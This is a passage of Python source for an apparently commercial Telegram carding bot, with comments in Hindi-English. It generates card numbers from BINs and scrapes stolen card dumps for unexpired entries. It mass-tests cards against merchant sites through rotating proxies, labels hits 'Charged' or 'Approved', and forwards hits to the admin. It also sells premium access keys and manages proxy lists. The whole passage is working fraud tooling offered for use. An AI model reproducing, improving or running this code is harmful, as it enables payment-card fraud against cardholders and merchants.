    # ✅ AWAIT LAGAYA (kyunki function ab async hai)
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD
    count = len(proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ Your proxy list is already empty."))
        return

    # ✅ Backup
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    backup_file = f"proxy_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        f.write("\n".join(proxies))

    await bot.send_message(user_id, f"📦 **Backup Created!** {count} proxies saved.", file=backup_file)
    try: os.remove(backup_file)
    except: pass

    # ✅ Clear user proxies
    data = await load_user_proxies()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_proxies(data)

    await event.reply(premium_emoji(f"""✅ **Your Proxies Cleared!**

🗑 Cleared: <code>{count}</code> proxies
📦 Backup: Sent above
📊 Your list is now empty.

💡 Use `/addproxy` to add new proxies manually.
💡 Use `/savetxt` to add via TXT file."""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/savetxt$'))
async def add_proxy_from_txt(event):
    user_id = event.sender_id

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing proxies."))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.document or not reply_msg.document.mime_type == 'text/plain':
        await event.reply(premium_emoji("❌ Please reply to a .txt file."))
        return

    # File size check (Telegram limit: 20MB)
    file_size = reply_msg.document.size
    if file_size > 5 * 1024 * 1024:  # 5MB limit for better performance
        await event.reply(premium_emoji("❌ File too large! Max 5MB allowed for proxy checking."))
        return

    status_msg = await event.reply(premium_emoji("📂 Reading proxies from TXT file..."))

    # ✅ Download file
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: 
            os.remove(file_path)
        except: 
            pass
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error reading file: {str(e)}"))
        return

    # ✅ Split line-by-line (remove empty lines & duplicates)
    proxies_to_add = list(dict.fromkeys(
        line.strip() for line in content.splitlines() if line.strip()
    ))

    if not proxies_to_add:
        await status_msg.edit(premium_emoji("❌ No valid proxies found in file."))
        return

    # Limit to 1000 proxies at once
    if len(proxies_to_add) > 1000:
        await status_msg.edit(
            premium_emoji(f"⚠️ Too many proxies ({len(proxies_to_add)}). Checking first 1000 only...")
        )
        proxies_to_add = proxies_to_add[:1000]

    await status_msg.edit(premium_emoji(f"🔄 REAL CHECKING {len(proxies_to_add)} proxies..."))

    # ✅ USER KE APNE PROXIES LOAD KARO (user_proxies.json)
    existing = await get_user_proxies_sync(user_id)  # ✅ await
    added = 0
    dead = 0

    # Filter out existing proxies
    new_proxies = [p for p in proxies_to_add if p not in existing]
    skipped = len(proxies_to_add) - len(new_proxies)

    # ✅ BATCH CHECK (faster - 10 at a time)
    batch_size = 10
    for i in range(0, len(new_proxies), batch_size):
        batch = new_proxies[i:i + batch_size]
        
        # Update status message with progress
        if i > 0:
            await status_msg.edit(
                premium_emoji(f"🔄 Checking {i}/{len(new_proxies)} proxies... (✅ {added} alive | ❌ {dead} dead)")
            )
        
        # Check batch concurrently
        results = await asyncio.gather(
            *[check_proxy(p) for p in batch],
            return_exceptions=True
        )
        
        for proxy, is_alive in zip(batch, results):
            if isinstance(is_alive, dict) and is_alive.get('alive'):
                await add_user_proxy(user_id, proxy)  # ✅ USER KE JSON MEIN SAVE
                added += 1
            else:
                dead += 1

    total = len(await get_user_proxies_sync(user_id))  # ✅ await

    final_msg = f"""
<b>✅ TXT PROXY CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
📄 Total in file: <code>{len(proxies_to_add)}</code>
✅ Alive Added: <code>{added}</code>
❌ Dead: <code>{dead}</code>
⏭ Already Exist: <code>{skipped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Total Your Proxies: <code>{total}</code>
"""

    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")
    
@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id

    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f" Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f" **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))

    except Exception as e:
        await event.reply(premium_emoji(f" Error removing site: {e}"))
@bot.on(events.NewMessage(pattern=r'^/gen\s+(.+)'))
async def gen_cc_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply("❌ Premium / Admin only.")
        return

    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if is_admin(user_id):
        plan = "👑 ADMIN"
    elif is_premium(user_id):
        plan = "💎 PREMIUM"
    else:
        plan = "✨ FREE"

    args = event.pattern_match.group(1).strip().split()
    if not args:
        await event.reply("Usage: /gen 601100 534109 477351 542124 40000")
        return

    bins = []
    total_cards = 10000  # Default total if no count given

    for arg in args:
        if arg.isdigit():
            if len(arg) <= 6:
                bins.append(arg)
            else:
                total_cards = int(arg)

    if not bins:
        await event.reply("❌ BIN daal bkl.\nExample: /gen 601100 534109 40000")
        return

    # Distribute total cards across BINs
    per_bin = max(1, total_cards // len(bins))
    all_cards = []
    for binp in bins:
        all_cards.extend(generate_cc(binp, per_bin))

    random.shuffle(all_cards)
    all_cards = all_cards[:total_cards]  # Exact total

    if all_cards:
        brand, bin_type, _, bank, country, flag = await get_bin_info(all_cards[0].split('|')[0])
    else:
        brand = bin_type = bank = country = flag = '-'

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Generated_CC_{user_id}_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for card in all_cards:
            await f.write(f"{card}\n")

    summary = f"""CC Generated Successfully
BINs: {', '.join(bins)}
Total Cards: {len(all_cards)}
Amount: ${random.randint(12,25)}

Brand: {brand} - {bin_type}
Bank: {bank}
Country: {country} {flag}

Time: 0.92 seconds
Checked By: <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""

    await event.reply(summary, file=filename, parse_mode="html")
    
    try:
        os.remove(filename)
    except:
        pass
        
@bot.on(events.NewMessage(pattern=r'^/scrape'))
async def pure_scrape(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium / Admin only."))
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📄 Reply to CC .txt file with /scrape"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Sirf .txt file reply kar."))
        return

    status = await event.reply(premium_emoji("<b>⚡ Pure CC Scraper Running...</b>"))

    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        raw_cards = extract_cc(content)
        total_found = len(raw_cards)

        unique_cards = list(dict.fromkeys(raw_cards))
        duplicates_removed = total_found - len(unique_cards)

        valid_cards = []
        expired = 0
        for card in unique_cards:
            try:
                _, month, year, _ = card.split('|')
                y = int(year) if len(year) == 4 else 2000 + int(year)
                if y < 2026 or (y == 2026 and int(month) < 8):
                    expired += 1
                else:
                    valid_cards.append(card)
            except:
                valid_cards.append(card)

        # Premium Summary
        summary = f"""<b>✅ 𝗦𝗖𝗥𝗔𝗣𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>
━━━━━━━━━━━━━━━━━━━━
<blockquote>
📊 𝗧𝗼𝘁𝗮𝗹 𝗙𝗼𝘂𝗻𝗱 : <code>{total_found}</code>
🗑 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲𝘀 : <code>{duplicates_removed}</code>
⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 : <code>{expired}</code>
✅ 𝗩𝗮𝗹𝗶𝗱 𝗖𝗖 : <code>{len(valid_cards)}</code>
</blockquote>
━━━━━━━━━━━━━━━━━━━━
<b>👑 𝗕𝘆 ➜ ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""

        await status.edit(premium_emoji(summary), parse_mode="html")

        if not valid_cards:
            await status.edit(premium_emoji("❌ No valid CC after cleaning."))
            return

        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        clean_file = f"Cleaned_CC_{user_id}_{timestamp}.txt"

        async with aiofiles.open(clean_file, 'w') as f:
            for card in valid_cards:
                await f.write(f"{card}\n")

        await bot.send_message(
            user_id,
            premium_emoji(f"""<b>📄 𝗖𝗟𝗘𝗔𝗡 𝗙𝗜𝗟𝗘 𝗥𝗘𝗔𝗗𝗬</b>
<blockquote>
💎 𝗩𝗮𝗹𝗶𝗱 𝗖𝗖 : <code>{len(valid_cards)}</code>
📁 𝗙𝗶𝗹𝗲 : <code>{clean_file}</code>
</blockquote>
🚀 𝗘𝗻𝗷𝗼𝘆 𝗙𝗮𝘀𝘁 𝗦𝗰𝗿𝗮𝗽𝗶𝗻𝗴"""),
            file=clean_file,
            parse_mode="html"
        )

        try:
            os.remove(clean_file)
        except:
            pass

    except Exception as e:
        await status.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"))
    finally:
        if 'file_path' in locals() and os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id

    # ✅ SIRF USER KI APNI PROXIES (user_proxies.json)
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD

    if not proxies:
        await event.reply(premium_emoji("""❌ **No proxies in your list!**

📌 Add proxies first:
<code>/addproxy ip:port</code>
<code>/savetxt</code> (reply to .txt file)

📋 View your proxies:
<code>/myproxies</code>"""), parse_mode="html")
        return

    status_msg = await event.reply(premium_emoji(f"😊 Checking {len(proxies)} proxies..."))

    alive_proxies = []
    dead_proxies = []
    total = len(proxies)
    checked = 0

    for proxy in proxies:
        alive = await check_proxy(proxy)
        if isinstance(alive, dict) and alive.get('alive'):
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
        checked += 1

        # ✅ HAR 5 PROXY KE BAAD UPDATE
        if checked % 5 == 0 or checked == total:
            await status_msg.edit(premium_emoji(f"""💧 Checking...

✅ Working: <code>{len(alive_proxies)}</code>
❌ Dead: <code>{len(dead_proxies)}</code>
📊 Progress: <code>{checked}/{total}</code>"""), parse_mode="html")

    # ✅ SIRF ALIVE PROXIES SAVE KARO (DEAD HATAO)
    # 🔥 IMPORTANT: Direct JSON write karo, load_user_proxies() use mat karo
    try:
        # Pehle existing data load karo
        if os.path.exists(USER_PROXY_FILE):
            with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
                all_data = json.load(f)
        else:
            all_data = {}
        
        # Update user's proxies with ONLY alive ones
        all_data[str(user_id)] = alive_proxies
        
        # Save back
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=4)
            
        print(f"✅ Saved {len(alive_proxies)} alive proxies for user {user_id}")
        
        # ✅ proxyfix: proxy.txt se bhi DEAD proxies hatao (checker me error nahi aayega)
        try:
            if dead_proxies and os.path.exists(PROXY_FILE):
                with open(PROXY_FILE, "r", encoding="utf-8") as f:
                    gpx = [l.strip() for l in f if l.strip()]
                dead_set = set(dead_proxies)
                gpx = [p for p in gpx if p not in dead_set]
                with open(PROXY_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(gpx) + ("\n" if gpx else ""))
                print(f"✅ proxy.txt: {len(dead_set)} dead removed, {len(gpx)} total")
        except Exception as e:
            print("⚠️ proxy.txt dead-cleanup fail:", e)
        
    except Exception as e:
        print(f"❌ Save error: {e}")
        # Fallback: use async function
        data = await load_user_proxies()
        data[str(user_id)] = alive_proxies
        await save_user_proxies(data)

    # ✅ Send TXT file of alive proxies
    if alive_proxies:
        txt_file = f"working_proxies_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive_proxies))
        await bot.send_message(user_id, f"📄 **{len(alive_proxies)} Working Proxies**", file=txt_file)
        try: os.remove(txt_file)
        except: pass

    await status_msg.edit(premium_emoji(f"""✅ **Proxy Check Complete!**

✅ Working: <code>{len(alive_proxies)}</code>
❌ Removed: <code>{len(dead_proxies)}</code>
📊 Total: <code>{total}</code>
📄 TXT Sent ✅

⚡ <b>Your proxy list updated — Dead removed, Alive kept!</b>"""), parse_mode="html")

async def improved_process_cards(status_msg, session_key, cards, sites, proxies, all_results, username, user_id):
    queue = asyncio.Queue(maxsize=0)
    for card in cards:
        await queue.put(card)   # safe put

    last_update = [time.time()]

    # 1000% FIX: Attach results for STOP handler + paused flag
    active_sessions[session_key] = {'paused': False, 'results': all_results}

    async def worker():
        while session_key in active_sessions:
            if active_sessions[session_key].get('paused'):
                await asyncio.sleep(0.5)  # Faster resume
                continue

            try:
                card = await asyncio.wait_for(queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                continue
            except asyncio.QueueEmpty:
                break

            res = await check_card_with_retry(card, sites, proxies, max_retries=8)

            # Hit handling (your original kept intact)
            if res['status'] == 'Charged':
                await send_hit_to_admin(res, user_id, "Charged")
                all_results['charged'].append(res)
                await send_realtime_hit(user_id, res, 'Charged', username)   # short wala (optional)
                await send_realtime_hit_full(user_id, res, 'Charged', username)  # FULL wala

            elif res['status'] == 'Approved':
                await send_hit_to_admin(res, user_id, "Approved")
                all_results['approved'].append(res)
                await send_realtime_hit_full(user_id, res, "Approved", username)
                await send_realtime_hit_full(user_id, res, 'Approved', username)  # FULL wala
            else:
                all_results['dead'].append(res)

            all_results['checked'] += 1
            queue.task_done()

            # Progress (your original)
            if time.time() - last_update[0] >= 1.0:
                last_update[0] = time.time()
                try:
                    await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                except:
                    pass

    try:
        workers = [asyncio.create_task(worker()) for _ in range(10)]

        while any(not w.done() for w in workers):
            if session_key not in active_sessions or active_sessions[session_key].get('paused') == 'stopping':
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            await asyncio.sleep(0.6)  # Optimized polling

        # Final update
        if session_key in active_sessions and not active_sessions[session_key].get('stopping'):
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    finally:
        # 1000% CLEANUP
        if session_key in active_sessions and not active_sessions[session_key].get('stopping'):
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results((locals().get('event') or _SafeEvent()).chat_id, all_results)  # Always send results (partial or full)


# ============================================================
# 🔥 NEW AUTO FAKE HITS (DM COPY CC = DANGER RED STYLE)
# ============================================================
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    save_user(user_id)

    if user_id in user_check_locks:
        await event.reply(premium_emoji("""<b>⚠️ ALREADY CHECKING!</b>

<b>🚫 Aap pehle se ek check chala rahe ho!</b>

<b>⏳ Please wait for it to complete or stop it.</b>
<b>🛑 Use /stop command to stop current check.</b>

<b>💡 After that, try /chk again.</b>"""), parse_mode="html")
        return

    is_admin_user = is_admin(user_id)
    is_prem_user = is_premium(user_id)

    if not is_admin_user and not is_prem_user:
        await event.reply(premium_emoji(f"""<b>🔒 ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 ʙᴜʟᴋ ᴄʜᴇᴄᴋ ɪs ғᴏʀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴏɴʟʏ!</b>

<b>📅 ᴘʟᴀɴs:</b>
<b>🔥 7 ᴅᴀʏs = $2</b>
<b>💎 30 ᴅᴀʏs = $5</b>

<b>👑 ᴅᴍ:</b> Admin
━━━━━━━━━━━━━━━━━━━━
<b>🔑 ʀᴇᴅᴇᴇᴍ:</b> <code>/redeem KEY</code>"""), parse_mode="html")
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply("❌ Reply to .txt file.")
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply("❌ Sirf .txt file reply kar.")
        return

    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()
    proxies = load_proxies()

    if not proxies:
        await event.reply("/addproxy add your proxy | ❌ No proxies available!")
        return

    if not user_sites and not global_sites:
        await event.reply("❌ No sites available!")
        return

    status_msg = await event.reply("🔄 Loading...")

    await status_msg.edit(
        f"""<b>🔄 Select Sites Source</b>

🟢 <b>Your Sites</b>
🔵 <b>Bot Sites</b>

<b>👇 Choose which sites to use:</b>""",
        buttons=[
            [
                Button.inline(f"🟢 MY SITES", f"chk_my_{status_msg.id}".encode(), style="success"),
                Button.inline(f"🔵 BOT SITES", f"chk_global_{status_msg.id}".encode(), style="primary"),
            ],
            [
                Button.inline("CANCEL", f"cancel_chk_{status_msg.id}".encode(), style="danger"),
            ]
        ],
        parse_mode="html"
    )

    active_sessions[f"chk_{user_id}_{status_msg.id}"] = {
        'user_id': user_id, 'username': username,
        'is_admin': is_admin_user, 'is_premium': is_prem_user,
        'reply_msg': reply_msg, 'status_msg_id': status_msg.id,
        'user_sites': user_sites, 'global_sites': global_sites, 'proxies': proxies
    }

    # ✅ User clicks button, then run_chk starts
    # This part is handled by button callbacks


@bot.on(events.CallbackQuery(pattern=rb"chk_my_(\d+)"))
async def chk_my_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    
    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return
    
    data = active_sessions[session_key]
    sites = data['user_sites']
    
    if not sites:
        await event.answer("❌ Aapne koi site add nahi ki!\nUse /addsites url pehle.", alert=True)
        return
    
    await event.answer(f"✅ Using YOUR {len(sites)} sites!", alert=True)
    try: await event.delete()
    except: pass
    
    asyncio.create_task(run_chk(data, sites))


@bot.on(events.CallbackQuery(pattern=rb"chk_global_(\d+)"))
async def chk_global_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    
    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return
    
    data = active_sessions[session_key]
    sites = data['global_sites']
    
    if not sites:
        await event.answer("❌ Bot sites bhi nahi hain!", alert=True)
        return
    
    await event.answer(f"✅ Using BOT {len(sites)} sites!", alert=True)
    try: await event.delete()
    except: pass
    
    asyncio.create_task(run_chk(data, sites))


@bot.on(events.CallbackQuery(pattern=rb"cancel_chk_(\d+)"))
async def cancel_chk_handler(event):
    msg_id = int(event.pattern_match.group(1).decode())
    await event.answer("❌ Cancelled!", alert=True)
    try: await event.delete()
    except: pass
    for key in list(active_sessions.keys()):
        if str(msg_id) in key: del active_sessions[key]
        
async def run_chk(data, sites):
    user_id = data['user_id']
    username = data['username']
    is_admin_user = data['is_admin']
    is_prem_user = data['is_premium']
    reply_msg = data['reply_msg']
    
    proxies = load_proxies()

    if not proxies:
        await bot.send_message(
            user_id,
            premium_emoji("""<b>❌ NO PROXY ADDED!</b>

<b>📌 proxy.txt mein proxies daalo!</b>

<b>🔧 Add proxies:</b>
<code>/addproxy ip:port</code>

<b>📋 View proxies:</b>
<code>/myproxies</code>"""),
            parse_mode="html"
        )
        return

    if user_id in user_check_locks:
        session_key = user_check_locks[user_id]
        if session_key not in active_sessions:
            del user_check_locks[user_id]
        else:
            await bot.send_message(
                user_id,
                premium_emoji("""<b>⚠️ ALREADY CHECKING!</b>

<b>🚫 Aap pehle se ek check chala rahe ho!</b>

<b>⏳ Please wait for it to complete or stop it.</b>
<b>🛑 Use /stop command to stop current check.</b>"""),
                parse_mode="html"
            )
            return

    user_check_locks[user_id] = f"{user_id}_{int(time.time())}"
    status_msg = None
    tasks = []  # ✅ Track tasks for cleanup

    try:
        status_msg = await bot.send_message(user_id, "🫆 Processing file...")

        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)

        if not cards:
            await status_msg.edit("❌ No valid cards found.")
            try: os.remove(file_path)
            except: pass
            return

        # ✅ LIMITS
        if is_admin_user:
            if len(cards) > 1000000:
                cards = cards[:1000000]
        elif is_prem_user:
            if len(cards) > 10000:
                await status_msg.edit(
                    premium_emoji(f"""<b>❌ LIMIT EXCEEDED!</b>

<b>💎 Premium Users:</b> Sirf <b>10,000 CC</b> per check allowed.

📌 <b>Your File:</b> <code>{len(cards)} CC</code>
⚠️ <b>Limit:</b> <code>10,000 CC</code>

💡 <b>Solution:</b>
➜ Apni file ko 10,000-10,000 CC ke chunks mein tod kar bhejo."""), 
                    parse_mode="html"
                )
                try: os.remove(file_path)
                except: pass
                return
            cards = cards[:10000]
        else:
            if len(cards) > 1500:
                await status_msg.edit(
                    premium_emoji(f"""<b>❌ LIMIT EXCEEDED!</b>

<b>⭐ Free Users:</b> Sirf <b>1,500 CC</b> per check allowed.

📌 <b>Your File:</b> <code>{len(cards)} CC</code>
⚠️ <b>Limit:</b> <code>1,500 CC</code>

💡 <b>Solution:</b>
➜ Premium le lo ya file ko 1,500-1,500 CC ke chunks mein tod kar bhejo."""), 
                    parse_mode="html"
                )
                try: os.remove(file_path)
                except: pass
                return
            cards = cards[:1500]

        try: os.remove(file_path)
        except: pass

        total_cards = len(cards)
        await status_msg.edit(f"🫆 Starting check for {total_cards} cards with {min(11, total_cards)} APIs...")

        shared_data = {
            'charged': [],
            'approved': [],
            'dead': [],
            'checked': 0,
            'total': total_cards,
            'errors': 0,
            'api_errors': 0,
            'start_time': time.time()
        }

        # ✅ Store session
        session_key = f"{user_id}_{status_msg.id}"
        active_sessions[session_key] = {
            'paused': False, 
            'results': shared_data,
            'stopping': False
        }

        # ✅ 11 APIs DISTRIBUTION
        active_apis = min(11, total_cards)
        part_size = total_cards // active_apis
        remainder = total_cards % active_apis
        
        tasks = []
        start_idx = 0
        
        for api_idx in range(1, active_apis + 1):
            cards_for_api = part_size + (1 if api_idx <= remainder else 0)
            if cards_for_api == 0:
                continue
            
            end_idx = start_idx + cards_for_api
            api_cards = cards[start_idx:end_idx]
            start_idx = end_idx
            
            # ✅ FIX: check_batch_worker_11 call karo
            task = asyncio.create_task(check_batch_worker_11(
                user_id, api_cards, sites, proxies,
                api_idx, status_msg.id, total_cards, shared_data
            ))
            tasks.append(task)
        
        # ✅ Wait with timeout
        if tasks:
            done, pending = await asyncio.wait(tasks, timeout=300, return_when=asyncio.ALL_COMPLETED)
            
            # ✅ Cancel any pending tasks
            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        
        # ✅ FINAL UPDATE
        await update_progress(user_id, status_msg.id, shared_data, total_cards, first_name=username, is_razorpay=False)
        
        # ✅ YEH 1 LINE ADD KARI HAI (send_final_results se pehle)
        shared_data['error_cards'] = shared_data.get('error_cards', [])  # Ensure error_cards exists

        # ✅ FINAL RESULTS
        await status_msg.delete()
        await send_final_results(user_id, shared_data)

    except asyncio.CancelledError:
        print(f"⚠️ run_chk cancelled for user {user_id}")
        if status_msg:
            try:
                await status_msg.edit("🛑 **Stopped!**\n\nPartial results sent.")
            except:
                pass

    except Exception as e:
        try:
            if status_msg:
                await status_msg.edit(f"❌ Error: {str(e)[:100]}")
        except:
            pass
        print(f"❌ run_chk Error: {e}")

    finally:
        # ✅ Cleanup
        if user_id in user_check_locks:
            del user_check_locks[user_id]
        if status_msg:
            session_key = f"{user_id}_{status_msg.id}"
            if session_key in active_sessions:
                del active_sessions[session_key]
        
        # ✅ Cancel any remaining tasks
        for task in tasks:
            if not task.done():
                task.cancel()
                try:
                    await task
                except:
                    pass
                    
def generate_key(days):    
    key = f"QURESHIxOTPxHUNTER-{random.randint(100000,999999)}-{days}D"
    with open(KEYS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{key}|{days}\n")
    return key
#QURESHIxOTP

# ==================== NOTICE SYSTEM ====================

# 1. Sabse pehle users save karne ka function


@bot.on(events.NewMessage(pattern=r'^/Note(?:\s|$)([\s\S]*)'))
async def notice_to_all(event):
    """Admin notice bhejo sabhi users ko - Full formatting support"""
    
    if not is_admin(event.sender_id):
        return
    
    # ✅ FIX: [\s\S]* captures EVERYTHING including newlines
    notice_text = event.pattern_match.group(1).strip()
    
    if not notice_text:
        await event.reply(premium_emoji("""<b>⚠️ ɴᴏᴛɪᴄᴇ ᴍᴇssᴀɢᴇ ᴅᴏ!</b>
━━━━━━━━━━━━━━━━━━━━
<b>💡 ᴇxᴀᴍᴘʟᴇ:</b>
<code>/Notice Bot update aaya hai!

Naye features add hue hain.
Sabhi users please /start karein.

Thank you! 🚀</code>
━━━━━━━━━━━━━━━━━━━━
<b>👑 ᴀᴅᴍɪɴ ᴏɴʟʏ!</b>"""), parse_mode="html")
        return
    
    users = []
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        for row in rows:
            users.append(row[0])
        conn.close()
    except Exception as e:
        await event.reply(premium_emoji(f"<b>❌ ᴅᴀᴛᴀʙᴀsᴇ ᴇʀʀᴏʀ:</b> <code>{e}</code>"), parse_mode="html")
        return
    
    if not users:
        await event.reply(premium_emoji("<b>❌ ᴋᴏɪ ᴜsᴇʀ ɴᴀʜɪ ʜᴀɪ! ᴘᴇʜʟᴇ ᴜsᴇʀs /start ᴋᴀʀᴇɴɢᴇ.</b>"), parse_mode="html")
        return
    
    try:
        me = await bot.get_me()
        bot_username = me.username
    except:
        bot_username = "Admin"
    
    # ✅ NOTICE MSG - PRESERVE ALL FORMATTING
    notice_msg = f"""<b></b>


{notice_text}

"""
    
    status = await event.reply(premium_emoji(f"<b>📤 ɴᴏᴛɪᴄᴇ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴜ {len(users)} ᴜsᴇʀs ᴋᴏ...</b>\n\n<b>⏳ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...</b>"), parse_mode="html")
    
    sent = 0
    failed = 0
    batch_size = 30  # ✅ Send in batches to avoid flood
    
    for i, user_id in enumerate(users):
        try:
            await bot.send_message(user_id, premium_emoji(notice_msg), parse_mode='html')
            sent += 1
            
            # ✅ Progress update every 30 users
            if sent % batch_size == 0:
                await status.edit(premium_emoji(f"""<b>📤 ɴᴏᴛɪᴄᴇ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴜ...</b>
━━━━━━━━━━━━━━━━━━━━
✅ <b>sᴇɴᴛ:</b> {sent}/{len(users)}
❌ <b>ꜰᴀɪʟᴇᴅ:</b> {failed}
⏳ <b>ᴘʀᴏɢʀᴇss:</b> {(sent/len(users)*100):.1f}%
━━━━━━━━━━━━━━━━━━━━
<b>⏱️ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...</b>"""), parse_mode="html")
            
            await asyncio.sleep(0.05)  # Small delay to avoid rate limits
            
        except Exception as e:
            failed += 1
            print(f"❌ Failed to send to {user_id}: {e}")
    
    # ✅ FINAL STATUS
    await status.edit(premium_emoji(f"""<b>✅ ɴᴏᴛɪᴄᴇ sᴇɴᴛ sᴜᴄᴄᴇssꜰᴜʟʟʏ! ✅</b>
━━━━━━━━━━━━━━━━━━━━
<b>📤 sᴜᴄᴄᴇss:</b> {sent}
<b>❌ ꜰᴀɪʟᴇᴅ:</b> {failed}
<b>👥 ᴛᴏᴛᴀʟ:</b> {len(users)}
